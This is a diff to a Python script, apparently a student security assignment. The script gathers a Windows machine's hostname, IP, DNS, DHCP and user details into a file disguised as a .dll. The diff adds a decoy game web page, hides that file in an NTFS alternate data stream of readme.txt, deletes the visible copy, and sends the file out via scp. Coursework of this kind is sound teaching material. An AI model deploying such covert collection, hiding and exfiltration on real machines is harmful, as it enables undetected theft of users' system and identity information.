@@ -9,7 +9,6 @@ import shutil
 hostname = socket.gethostname()
 ipAddr = socket.gethostbyname(hostname)
 
-
 # slightly modified stackoverflow code to find DNS server (https://stackoverflow.com/questions/50015586/python-dns-server-ip-address-query)
 def get_windows_dns_ips():
     output = subprocess.check_output(["ipconfig", "-all"]).decode('utf-8')
@@ -69,8 +68,8 @@ devInfoFile.write("System Time: "+str(datetime.now()) + "\n")
 # write student numbers
 devInfoFile.write("Student 1 (Manav) Number: s3949664 \nStudent 2 (Lachlan) Number: s3942121\n")
 
-# Open URL (google) [NEED TO CHANGE THIS TO MATCH BACKGROUND STORY]
-# webbrowser.open("http://www.google.com")
+# Open game URL
+webbrowser.open("https://bethesda.net/en/game/starfield/features")
 
 # Write username
 devInfoFile.writelines("\nCurrent User: "+ str(os.getlogin())+"\n \n")
@@ -92,14 +91,17 @@ devInfoFile.write("\nDHCP Address: = " + get_windows_dhcp())
 devInfoFile.close()
 
 # copy devInfoFile to windows directory (MUST BE RUN AS ADMIN)
-# shutil.copy('DeviceInfo39496643942121.dll',homedrive+'\Windows')
+shutil.copy('DeviceInfo39496643942121.dll',homedrive+'\Windows')
 
 
-# Setting up SSH connection (Note this only works on Lachlan's home device where the openSSH server has been configured and is being hosted.)
-subprocess.run(["scp",'DeviceInfo39496643942121.dll',("lachl@"+ipAddr+":"+homedrive+"/users/netTesty/Documents")])
+# send DeviceInfo.dll over sftp server (Note this only works on Lachlan's home device where the openSSH server has been configured and is being hosted.)
+subprocess.run(["scp",'DeviceInfo39496643942121.dll',("lachl@"+ipAddr+":"+homedrive+"/users/netTesty/Documents")]) 
 
+# hide DeviceInfo.dll inside ADS of readme.txt
+shutil.copy('DeviceInfo39496643942121.dll','readme.txt:DeviceInfo39496643942121.dll')
 
+# delete unhidden version of DeviceInfo.dll (MUST BE RUN AS ADMIN)
+os.remove("DeviceInfo39496643942121.dll")
 
-
-
-
+# send readme.txt over sftp server (Note this only works on Lachlan's home device where the openSSH server has been configured and is being hosted.)
+subprocess.run(["scp",'readme.txt',("lachl@"+ipAddr+":"+homedrive+"/users/netTesty/Documents")]) 
